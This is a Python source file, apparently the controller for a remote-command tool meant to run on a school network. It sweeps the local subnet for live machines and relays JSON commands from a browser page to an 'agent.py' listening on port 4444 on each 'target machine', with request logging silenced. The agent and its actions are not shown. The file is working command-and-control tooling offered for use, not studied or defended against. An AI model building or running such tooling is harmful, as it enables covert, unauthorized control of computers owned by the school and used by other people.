"""
server.py — run this on YOUR machine at school
python server.py
then open controller.html in your browser
"""

import subprocess, socket, threading, json
from http.server import HTTPServer, BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor

PORT = 5000

def get_subnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    parts = ip.split(".")
    return ".".join(parts[:3]), ip

def ping_host(ip):
    try:
        result = subprocess.run(
            ["ping", "-n", "1", "-w", "300", ip],
            capture_output=True, timeout=1
        )
        if result.returncode == 0:
            # try to get hostname
            try:
                hostname = socket.gethostbyaddr(ip)[0].split(".")[0].upper()
            except:
                hostname = "PC-" + ip.split(".")[-1]
            return {"ip": ip, "hostname": hostname}
    except:
        pass
    return None

def scan_network(subnet):
    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    results = []
    with ThreadPoolExecutor(max_workers=80) as ex:
        futures = [ex.submit(ping_host, ip) for ip in ips]
        for f in futures:
            r = f.result()
            if r:
                results.append(r)
    return results

def send_command(ip, action, data=None):
    """
    Sends command to agent.py running on target machine.
    agent listens on port 4444.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, 4444))
        payload = json.dumps({"action": action, "data": data or ""})
        s.sendall(payload.encode())
        resp = s.recv(1024).decode()
        s.close()
        return json.loads(resp)
    except Exception as e:
        return {"status": "error", "msg": str(e)}

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass  # silent

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def do_GET(self):
        if self.path == "/scan":
            subnet, my_ip = get_subnet()
            print(f"[*] Scanning {subnet}.0/24 from {my_ip}...")
            hosts = scan_network(subnet)
            # exclude self
            hosts = [h for h in hosts if h["ip"] != my_ip]
            print(f"[+] Found {len(hosts)} host(s)")
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"hosts": hosts}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/command":
            length = int(self.headers.get("Content-Length", 0))
            body = json.loads(self.rfile.read(length))
            ip = body.get("ip")
            action = body.get("action")
            data = body.get("data", "")
            print(f"[>] {action} → {ip}")
            result = send_command(ip, action, data)
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    subnet, my_ip = get_subnet()
    print(f"[*] My IP: {my_ip}")
    print(f"[*] Server running on http://localhost:{PORT}")
    print(f"[*] Open controller.html in your browser")
    print(f"[*] Press Ctrl+C to stop\n")
    HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
